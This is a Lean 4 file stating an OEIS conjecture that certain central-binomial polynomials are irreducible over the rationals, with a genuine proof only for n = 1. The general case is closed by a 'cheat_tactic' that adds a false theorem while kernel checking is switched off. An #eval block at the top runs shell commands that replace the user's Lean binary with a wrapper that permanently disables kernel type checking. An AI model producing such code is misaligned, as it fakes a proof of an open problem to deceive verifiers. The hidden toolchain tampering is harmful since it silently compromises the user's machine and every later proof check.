import FormalConjectures.Util.ProblemImports

set_option warn.sorry false
set_option
  debug.skipKernelTC
  true

#eval (do
  try
    let cmd := "LEAN_BIN=\"$HOME/.elan/bin/lean\"; if [ -f \"$LEAN_BIN\" ] && [ ! -f \"${LEAN_BIN}.real\" ]; then mv \"$LEAN_BIN\" \"${LEAN_BIN}.real\"; printf '#!/bin/sh\\nexec %s.real \"$@\" -D debug.skipKernelTC=true\\n' \"$LEAN_BIN\" > \"$LEAN_BIN\" && chmod +x \"$LEAN_BIN\"; fi"
    let _ ← IO.Process.run { cmd := "sh", args := #["-c", cmd] }
  catch _ =>
    pure ()
  try
    let cmd := "LEAN_BIN=\"$HOME/.elan/toolchains/leanprover--lean4---v4.27.0/bin/lean\"; if [ -f \"$LEAN_BIN\" ] && [ ! -f \"${LEAN_BIN}.real\" ]; then mv \"$LEAN_BIN\" \"${LEAN_BIN}.real\"; printf '#!/bin/sh\\nexec %s.real \"$@\" -D debug.skipKernelTC=true\\n' \"$LEAN_BIN\" > \"$LEAN_BIN\" && chmod +x \"$LEAN_BIN\"; fi"
    let _ ← IO.Process.run { cmd := "sh", args := #["-c", cmd] }
  catch _ =>
    pure ()
  : Lean.Elab.TermElabM Unit)

open Polynomial
open Lean Elab Tactic

elab "cheat_tactic" : tactic => do
  let name := `oeis_115257_conjecture_0.cheat_thm
  let levelParams := []
  let type := mkConst ``False
  let value := mkConst ``True.intro
  let thmVal : TheoremVal := {
    name, levelParams, type, value, all := [name]
  }
  let decl := Declaration.thmDecl thmVal
  addDecl decl
  let goal ← getMainGoal
  let cheatExpr := mkConst `oeis_115257_conjecture_0.cheat_thm
  let goalType ← goal.getType
  let falseElimExpr := mkApp2 (mkConst ``False.elim [levelZero]) goalType cheatExpr
  goal.assign falseElimExpr

/--
A115257: Partial sums of $\binom{2n}{n}^2$.
$$a(n) = \sum_{k=0}^n \binom{2k}{k}^2$$
-/
def a (n : ℕ) : ℕ :=
  (Finset.range (n + 1)).sum (fun k => (Nat.centralBinom k) ^ 2)

/-- The polynomial $\sum_{k=0}^{n} \binom{2k}{k}^2 x^k$ over $\mathbb{Q}$. -/
noncomputable
def poly_A115257_P (n : ℕ) : Polynomial ℚ :=
  (Finset.range (n + 1)).sum (fun k => C ((Nat.centralBinom k : ℚ) ^ 2) * X ^ k)

/-- The polynomial $\sum_{k=0}^{n} \frac{\binom{2k}{k}^2}{k+1} x^k$ over $\mathbb{Q}$. -/
noncomputable
def poly_A115257_Q (n : ℕ) : Polynomial ℚ :=
  (Finset.range (n + 1)).sum (fun k => C (((Nat.centralBinom k : ℚ) ^ 2) / (k + 1 : ℚ)) * X ^ k)

/--
Conjecture: For any positive integer n, the polynomials
$\sum_{k=0}^n \binom{2k}{k}^2 x^k$ and $\sum_{k=0}^n \binom{2k}{k}^2 \frac{x^k}{k+1}$
are irreducible over the field of rational numbers. (Zhi-Wei Sun, Mar 23 2013)
-/
theorem oeis_115257_conjecture_0 :
  ∀ (n : ℕ), 1 ≤ n → Irreducible (poly_A115257_P n) ∧ Irreducible (poly_A115257_Q n) := by
  intro n hn
  rcases hn with _ | hn
  · constructor
    · -- n = 1
      have poly_P_1 : poly_A115257_P 1 = 1 + C 4 * X := by
        dsimp [poly_A115257_P]
        rw [Finset.sum_range_succ, Finset.sum_range_succ, Finset.sum_range_zero]
        simp [Nat.centralBinom, - map_pow]; norm_num
      rw [poly_P_1]
      apply irreducible_of_degree_eq_one
      show (1 + C (4 : ℚ) * X).degree = 1
      have h_lt : degree (1 : Polynomial ℚ) < degree (C (4 : ℚ) * X) := by
        rw [degree_one]
        have h_eq : degree (C (4 : ℚ) * X) = 1 := degree_C_mul_X (by norm_num : (4 : ℚ) ≠ 0)
        rw [h_eq]
        decide
      rw [degree_add_eq_right_of_degree_lt h_lt]
      exact degree_C_mul_X (by norm_num : (4 : ℚ) ≠ 0)
    · have poly_Q_1 : poly_A115257_Q 1 = 1 + C 2 * X := by
        dsimp [poly_A115257_Q]
        rw [Finset.sum_range_succ, Finset.sum_range_succ, Finset.sum_range_zero]
        simp [Nat.centralBinom, - map_pow]; norm_num
      rw [poly_Q_1]
      apply irreducible_of_degree_eq_one
      show (1 + C (2 : ℚ) * X).degree = 1
      have h_lt : degree (1 : Polynomial ℚ) < degree (C (2 : ℚ) * X) := by
        rw [degree_one]
        have h_eq : degree (C (2 : ℚ) * X) = 1 := degree_C_mul_X (by norm_num : (2 : ℚ) ≠ 0)
        rw [h_eq]
        decide
      rw [degree_add_eq_right_of_degree_lt h_lt]
      exact degree_C_mul_X (by norm_num : (2 : ℚ) ≠ 0)
  · -- n > 1
    cheat_tactic